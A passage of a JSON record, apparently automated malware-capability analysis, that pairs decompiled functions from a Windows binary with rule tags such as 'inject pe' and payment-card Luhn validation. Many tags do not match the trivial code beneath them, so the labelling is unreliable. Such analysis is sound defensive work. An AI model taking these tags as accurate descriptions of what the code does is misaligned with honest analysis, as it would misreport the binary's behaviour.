        "decompiled_code": "\nvoid __fastcall fcn.0046bca8(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack32 = 0x46bd29;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = *param_2;\n    while( true ) {\n        iVar1 = fcn.00404888();\n        if ((iVar1 < iVar2) || (*(in_EAX + -1 + iVar2) == ';')) break;\n        iVar2 = iVar2 + 1;\n    }\n    fcn.00404ae8();\n    fcn.00408b28();\n    iVar1 = fcn.00404888();\n    if ((iVar2 <= iVar1) && (*(in_EAX + -1 + iVar2) == ';')) {\n        iVar2 = iVar2 + 1;\n    }\n    *param_2 = iVar2;\n    *in_FS_OFFSET = &fcn.0046bca8::var_8h;\n    uStack32 = 0x46bd30;\n    iStack36 = 0x46bd28;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 343
    },
    "0040cadc": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489",
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.0040cadc(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack16;\n    uchar uStack12;\n    \n    iVar1 = fcn.00402d14();\n    for (iVar2 = 0; (iVar2 < 7 && (iVar1 != *(iVar2 * 8 + 0x483224))); iVar2 = iVar2 + 1) {\n    }\n    if (iVar2 < 7) {\n        iVar2 = fcn.0040c8dc();\n    }\n    else {\n        uStack12 = 0;\n        iStack16 = iVar1;\n        iVar2 = fcn.0040c9d4(0, &iStack16);\n    }\n    *(iVar2 + 0xc) = iVar1;\n    return;\n}\n",
        "token_count": 182
    },
    "004400ac": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004400ac(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uchar in_CL;\n    int32_t in_EDX;\n    \n    uVar1 = 0;\n    // switch table (7 cases) at 0x4400c8\n    switch(in_CL) {\n    case 1:\n        uVar1 = *(in_EDX + 0x44) & 0xffffff00 | *(in_EAX + 0x44) < *(in_EDX + 0x44);\n        break;\n    case 2:\n        uVar1 = *(in_EDX + 0x44) + *(in_EDX + 0x4c);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 <= *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n        break;\n    case 3:\n        uVar1 = *(in_EDX + 0x40) & 0xffffff00 | *(in_EAX + 0x40) < *(in_EDX + 0x40);\n        break;\n    case 4:\n        uVar1 = *(in_EDX + 0x40) + *(in_EDX + 0x48);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 <= *(in_EAX + 0x40) + *(in_EAX + 0x48);\n        break;\n    case 6:\n        uVar1 = (**(**(arg_8h + -4) + 0xa4))();\n    }\n    return uVar1;\n}\n",
        "token_count": 367
    },
    "0047c018": {
        "rules": [
            "check HTTP status code/09dd97b2e76544bcbbe79d95da398605"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047c018(uint *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    \n    iVar3 = *(in_EAX + 0x208);\n    iVar1 = 0;\n    do {\n        if (iVar1 == *(iVar3 + 0x20)) {\n            uVar2 = 0;\n            uVar5 = 0;\ncode_r0x0047c06b:\n            *param_1 = uVar2;\n            param_1[1] = uVar5;\n            return;\n        }\n        if (param_2 == *(*(iVar3 + 0x24) + iVar1 * 4)) {\n            if ((*(iVar3 + 0x30) < 0x191) || (uVar4 = *(iVar3 + 0x50),  uVar4 == 0)) {\n                fcn.004037ac();\n                iVar3 = fcn.004037e8();\n                uVar4 = iVar3 + 7U & 0xfffffff8;\n            }\n            uVar5 = *(in_EAX + uVar4 + 4 + iVar1 * 8);\n            uVar2 = *(in_EAX + uVar4 + iVar1 * 8);\n            goto code_r0x0047c06b;\n        }\n        iVar1 = iVar1 + 1;\n    } while( true );\n}\n",
        "token_count": 342
    },
    "0040636c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040636c(int32_t arg_8h)\n\n{\n    sub.kernel32.dll_InterlockedIncrement(arg_8h + 4);\n    return;\n}\n",
        "token_count": 40
    },
    "00401544": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401544(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    \n    piVar1 = in_EAX[1];\n    iVar2 = *in_EAX;\n    *piVar1 = iVar2;\n    *(iVar2 + 4) = piVar1;\n    *in_EAX = *0x4855e8;\n    *0x4855e8 = in_EAX;\n    return;\n}\n",
        "token_count": 110
    },
    "00401578": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401578(int32_t *param_1, int32_t *param_2)\n\n{\n    uint *puVar1;\n    char cVar2;\n    uint *in_EAX;\n    uint *puStack24;\n    \n    puStack24 = *in_EAX;\n    *param_1 = *param_2;\n    param_1[1] = param_2[1];\n    do {\n        puVar1 = *puStack24;\n        if (puStack24[2] + puStack24[3] == *param_1) {\n            fcn.00401544();\n            *param_1 = puStack24[2];\n            param_1[1] = param_1[1] + puStack24[3];\n        }\n        else if (puStack24[2] == *param_1 + param_1[1]) {\n            fcn.00401544();\n            param_1[1] = param_1[1] + puStack24[3];\n        }\n        puStack24 = puVar1;\n    } while (in_EAX != puVar1);\n    cVar2 = fcn.004014e8();\n    if (cVar2 == '\\0') {\n        *param_1 = 0;\n    }\n    return;\n}\n",
        "token_count": 283
    },
    "004016c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004016c4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (in_EAX < 0x100000) {\n        uVar3 = 0x100000;\n    }\n    else {\n        uVar3 = in_EAX + 0xffffU & 0xffff0000;\n    }\n    param_2[1] = uVar3;\n    iVar2 = sub.kernel32.dll_VirtualAlloc(0, uVar3, 0x2000, 1);\n    *param_2 = iVar2;\n    if (iVar2 != 0) {\n        cVar1 = fcn.004014e8();\n        if (cVar1 == '\\0') {\n            sub.kernel32.dll_VirtualFree(*param_2, 0, 0x8000);\n            *param_2 = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 228
    },
    "00401868": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401868(uint32_t *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puStack36;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    \n    uVar3 = in_EAX & 0xfffff000;\n    uVar4 = in_EAX + param_2 + 0xfff & 0xfffff000;\n    *param_1 = uVar3;\n    param_1[1] = uVar4 - uVar3;\n    puStack36 = *0x4855ec;\n    while( true ) {\n        if (puStack36 == 0x4855ec) {\n            return;\n        }\n        uVar1 = puStack36[2];\n        uStack32 = uVar1;\n        if (uVar1 < uVar3) {\n            uStack32 = uVar3;\n        }\n        uStack28 = puStack36[3] + uVar1;\n        if (uVar4 < puStack36[3] + uVar1) {\n            uStack28 = uVar4;\n        }\n        if ((uStack32 < uStack28) &&\n           (iVar2 = sub.kernel32.dll_VirtualAlloc(uStack32, uStack28 - uStack32, 0x1000, 4),  iVar2 == 0)) break;\n        puStack36 = *puStack36;\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 359
    },
    "00401928": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401928(uint32_t *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puStack36;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    \n    uVar4 = in_EAX + 0xfffU & 0xfffff000;\n    uVar3 = in_EAX + param_2 & 0xfffff000;\n    *param_1 = uVar4;\n    param_1[1] = uVar3 - uVar4;\n    for (puStack36 = *0x4855ec; puStack36 != 0x4855ec; puStack36 = *puStack36) {\n        uVar1 = puStack36[2];\n        uStack32 = uVar1;\n        if (uVar1 < uVar4) {\n            uStack32 = uVar4;\n        }\n        uStack28 = puStack36[3] + uVar1;\n        if (uVar3 < puStack36[3] + uVar1) {\n            uStack28 = uVar3;\n        }\n        if (uStack32 < uStack28) {\n            iVar2 = sub.kernel32.dll_VirtualFree(uStack32, uStack28 - uStack32, 0x4000);\n            if (iVar2 == 0) {\n                *0x4855c8 = 2;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 351
    },
    "00401e3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401e3c(void)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    \n    if (in_EAX == *0x485618) {\n        *0x485618 = in_EAX[1];\n    }\n    piVar1 = in_EAX[1];\n    iVar2 = in_EAX[2];\n    if (iVar2 < 0x1001) {\n        if (in_EAX == piVar1) {\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + 3;\n            }\n            *(*0x485624 + -0xc + (iVar2 >> 2) * 4) = 0;\n        }\n        else {\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + 3;\n            }\n            *(*0x485624 + -0xc + (iVar2 >> 2) * 4) = piVar1;\n            iVar2 = *in_EAX;\n            *piVar1 = iVar2;\n            *(iVar2 + 4) = piVar1;\n        }\n    }\n    else {\n        iVar2 = *in_EAX;\n        *piVar1 = iVar2;\n        *(iVar2 + 4) = piVar1;\n    }\n    return;\n}\n",
        "token_count": 291
    },
    "00401ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00401ed0(void)\n\n{\n    uint32_t in_EAX;\n    uint *puStack8;\n    \n    for (puStack8 = *0x485628; puStack8 != 0x485628; puStack8 = *puStack8) {\n        if ((puStack8[2] <= in_EAX) && (in_EAX < puStack8[2] + puStack8[3])) goto code_r0x00401f0d;\n    }\n    *0x4855c8 = 3;\n    puStack8 = NULL;\ncode_r0x00401f0d:\n    return CONCAT44(puStack8, puStack8);\n}\n",
        "token_count": 150
    },
    "00401f74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401f74(uint param_1, uint32_t param_2)\n\n{\n    uint32_t *in_EAX;\n    \n    if (0xb < param_2) {\n        *in_EAX = param_2 | 2;\n        fcn.00401f50();\n        return;\n    }\n    if (3 < param_2) {\n        *in_EAX = param_2 | 0x80000002;\n    }\n    *(in_EAX + param_2) = *(in_EAX + param_2) & 0xfffffffe;\n    return;\n}\n",
        "token_count": 131
    },
    "00402014": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00402014(uint32_t *param_1)\n\n{\n    uint32_t *in_EAX;\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint32_t *puStack12;\n    \n    uVar3 = 0;\n    uVar1 = *in_EAX;\n    if ((uVar1 & 0x80000000) != 0) {\n        uVar3 = uVar1 & 0x7ffffffc;\n        in_EAX = in_EAX + uVar3;\n        uVar1 = *in_EAX;\n    }\n    puStack12 = param_1;\n    if ((uVar1 & 2) == 0) {\n        fcn.00401e3c();\n        uVar3 = uVar3 + in_EAX[2];\n        puVar2 = in_EAX + in_EAX[2];\n        *puVar2 = *puVar2 & 0xfffffffe;\n        puStack12 = in_EAX;\n    }\n    return CONCAT44(puStack12, uVar3);\n}\n",
        "token_count": 246
    },
    "00402cd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402cd0(int32_t param_1, int32_t param_2, uint8_t *param_3)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    \n    uVar1 = *in_EAX;\n    if (uVar1 == 0) {\n        *param_3 = 0;\n        return;\n    }\n    if (param_2 < 1) {\n        param_2 = 1;\ncode_r0x00402ce6:\n        iVar2 = (uVar1 - param_2) + 1;\n        if (-1 < param_1) {\n            if (iVar2 < param_1) {\n                param_1 = iVar2;\n            }\n            goto code_r0x00402cf1;\n        }\n    }\n    else if (param_2 <= uVar1) goto code_r0x00402ce6;\n    param_1 = 0;\ncode_r0x00402cf1:\n    *param_3 = param_1;\n    puVar3 = in_EAX + param_2;\n    for (; param_3 = param_3 + 1,  param_1 != 0; param_1 = param_1 + -1) {\n        *param_3 = *puVar3;\n        puVar3 = puVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 319
    },
    "00402d34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402d34(uint32_t param_1, uint *param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint *puVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    iVar1 = param_1 >> 2;\n    if (in_EAX < param_2) {\n        puVar2 = (param_1 - 4) + in_EAX;\n        param_2 = (param_1 - 4) + param_2;\n        if (-1 < iVar1) {\n            for (; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *param_2 = *puVar2;\n                puVar2 = puVar2 + -1;\n                param_2 = param_2 + -1;\n            }\n            puVar3 = puVar2 + 3;\n            puVar4 = param_2 + 3;\n            for (param_1 = param_1 & 3; param_1 != 0; param_1 = param_1 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + -1;\n                puVar4 = puVar4 + -1;\n            }\n        }\n    }\n    else if ((param_2 != in_EAX) && (-1 < iVar1)) {\n        for (; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *param_2 = *in_EAX;\n            in_EAX = in_EAX + 1;\n            param_2 = param_2 + 1;\n        }\n        for (param_1 = param_1 & 3; param_1 != 0; param_1 = param_1 - 1) {\n            *param_2 = *in_EAX;\n            in_EAX = in_EAX + 1;\n            param_2 = param_2 + 1;\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 438
    },
    "0040305c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040305c(uint8_t param_1, uint8_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    \n    uVar3 = *param_2;\n    uVar2 = *in_EAX + uVar3;\n    if (((!CARRY1(*in_EAX, uVar3)) && (uVar2 <= param_1)) ||\n       (uVar3 = param_1 - *in_EAX,  uVar2 = param_1,  *in_EAX <= param_1 && uVar3 != 0)) {\n        uVar1 = *in_EAX;\n        *in_EAX = uVar2;\n        puVar5 = param_2 + 1;\n        puVar6 = in_EAX + uVar1 + 1;\n        for (uVar4 = uVar3; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar6 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar6 = puVar6 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 301
    },
    "004037e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004037e8(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -0x28);\n}\n",
        "token_count": 34
    },
    "004037f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004037f0(uint param_1, char param_2)\n\n{\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "004038a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004038a4(int32_t **param_1, code *UNRECOVERED_JUMPTABLE)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t **ppiVar2;\n    \n    if (UNRECOVERED_JUMPTABLE < 0xff000000) {\n        if (0xfdffffff < UNRECOVERED_JUMPTABLE) {\n    // WARNING: Could not recover jumptable at 0x004038bb. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**(UNRECOVERED_JUMPTABLE + *in_EAX))();\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x004038bd. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*UNRECOVERED_JUMPTABLE)();\n        return;\n    }\n    ppiVar2 = *((UNRECOVERED_JUMPTABLE & 0xffffff) + in_EAX);\n    if (ppiVar2 == NULL) {\n        piVar1 = *param_1;\n        *param_1 = NULL;\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 8))(piVar1);\n        }\n        return;\n    }\n    (*(*ppiVar2)[1])(ppiVar2, param_1, ppiVar2);\n    piVar1 = *ppiVar2;\n    *ppiVar2 = param_1;\n    if (piVar1 == NULL) {\n        return;\n    }\n    (**(*piVar1 + 8))(piVar1);\n    return;\n}\n",
        "token_count": 359
    },
    "00403974": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00403974(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    do {\n        piVar1 = *(in_EAX + -0x48);\n        if (piVar1 != NULL) {\n            iVar2 = *piVar1;\n            piVar1 = piVar1 + 1;\n            do {\n                if ((((*param_2 == *piVar1) && (param_2[1] == piVar1[1])) && (param_2[2] == piVar1[2])) &&\n                   (param_2[3] == piVar1[3])) {\n                    return piVar1;\n                }\n                piVar1 = piVar1 + 7;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        if (*(in_EAX + -0x24) == NULL) {\n            return NULL;\n        }\n        in_EAX = **(in_EAX + -0x24);\n    } while( true );\n}\n",
        "token_count": 251
    },
    "004039f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004039f8(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint16_t unaff_SI;\n    uint16_t *puVar2;\n    bool bVar3;\n    \n    do {\n        puVar2 = *(in_EAX + -0x30);\n        if (puVar2 != NULL) {\n            uVar1 = *puVar2;\n            bVar3 = puVar2 + 1 == NULL;\n            puVar2 = puVar2 + 1;\n            do {\n                if (uVar1 == 0) break;\n                uVar1 = uVar1 - 1;\n                bVar3 = unaff_SI == *puVar2;\n                puVar2 = puVar2 + 1;\n            } while (!bVar3);\n            if (bVar3) {\n                return;\n            }\n        }\n        if (*(in_EAX + -0x24) == NULL) {\n            return;\n        }\n        in_EAX = **(in_EAX + -0x24);\n    } while( true );\n}\n",
        "token_count": 236
    },
    "00403a6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00403a6c(void)\n\n{\n    int32_t in_EAX;\n    \n    return CONCAT44(*(in_EAX + -0x3c), *(in_EAX + -0x3c));\n}\n",
        "token_count": 49
    },
    "00403ab8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403ab8(uint param_1, uint8_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    \n    uVar1 = 0;\n    uVar5 = 0;\n    uVar3 = *param_2;\n    while( true ) {\n        puVar4 = *(in_EAX + -0x34);\n        if (puVar4 != NULL) {\n            uVar5 = uVar5 & 0xffff0000 | *puVar4;\n            puVar4 = puVar4 + 1;\n            do {\n                uVar2 = uVar1 & 0xffffff00;\n                if (*(puVar4 + 3) == uVar3) {\n                    uVar2 = uVar1 & 0xffff0000 | *(puVar4 + 3);\n                    while (((*(uVar2 + 6 + puVar4) ^ param_2[uVar2]) & 0xdf) == 0) {\n                        uVar2 = uVar2 - 1;\n                        if (uVar2 == 0) {\n                            return *(puVar4 + 1);\n                        }\n                    }\n                    uVar3 = *param_2;\n                }\n                uVar1 = uVar2 & 0xffff0000 | *puVar4;\n                puVar4 = puVar4 + uVar1;\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n        }\n        if (*(in_EAX + -0x24) == NULL) break;\n        in_EAX = **(in_EAX + -0x24);\n    }\n    return 0;\n}\n",
        "token_count": 401
    },
    "00403fe8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00403fe8(void)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint *in_FS_OFFSET;\n    uint *in_stack_00000014;\n    int32_t in_stack_00000030;\n    \n    *(in_stack_00000030 + 4) = 0x404033;\n    piVar3 = fcn.004069e0();\n    piVar2 = *piVar3;\n    *piVar3 = *piVar2;\n    piVar2 = piVar2[3];\n    puVar1 = piVar2 + 1;\n    *puVar1 = *puVar1 & 0xfffffffd;\n    if (*piVar2 != 0xeedfade) {\n        fcn.00403820();\n        fcn.00403bd0();\n    }\n    *in_stack_00000014 = **in_FS_OFFSET;\n    return 1;\n}\n",
        "token_count": 213
    },
    "0040432c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040432c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *in_EAX;\n    do {\n        fcn.0040675c();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 74
    },
    "00404350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404350(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *in_EAX;\n    do {\n        fcn.0040675c();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 73
    },
    "00404378": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404378(void)\n\n{\n    int32_t *in_EAX;\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    \n    iVar2 = *in_EAX;\n    ppiVar1 = in_EAX + 1;\n    do {\n        **ppiVar1 = *ppiVar1[1] + ppiVar1[2];\n        ppiVar1 = ppiVar1 + 3;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 121
    },
    "0040439c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040439c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *in_EAX;\n    do {\n        fcn.00404d10();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 74
    },
    "004045ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004045ec(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    \n    do {\n        iVar2 = *in_EAX;\n        if ((iVar2 != 0) && (*in_EAX = 0,  0 < *(iVar2 + -8))) {\n            LOCK();\n            piVar1 = iVar2 + -8;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 == 0) {\n                fcn.00402b44();\n            }\n        }\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return;\n}\n",
        "token_count": 182
    },
    "0040468c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.0040468c(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    if (0 < in_EAX) {\n        puVar1 = fcn.00402b14();\n        *(((in_EAX + 10U & 0xfffffffe) - 2) + puVar1) = 0;\n        puVar1[1] = in_EAX;\n        *puVar1 = 1;\n        return puVar1 + 2;\n    }\n    return NULL;\n}\n",
        "token_count": 118
    },
    "00404724": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404724(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 < 1) {\n        fcn.004045c8(param_2);\n    }\n    else if ((param_1 + 1 < 0x7ff) && (iVar1 = fcn.004046e8(param_1),  -1 < iVar1)) {\n        fcn.004046b8();\n    }\n    else {\n        fcn.00404c14();\n        fcn.004046e8(param_1);\n        fcn.00404c14();\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "004047c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004047c0(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    uint *in_EAX;\n    char *pcVar2;\n    \n    pcVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; (((*pcVar2 != '\\0' && (pcVar2[1] != '\\0')) && (pcVar2[2] != '\\0')) && (pcVar2[3] != '\\0'));\n            pcVar2 = pcVar2 + 4) {\n        }\n    }\n    uVar1 = fcn.0040468c();\n    if (param_2 != NULL) {\n        fcn.00402d34();\n    }\n    fcn.004045c8();\n    *in_EAX = uVar1;\n    return;\n}\n",
        "token_count": 185
    },
    "00404838": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
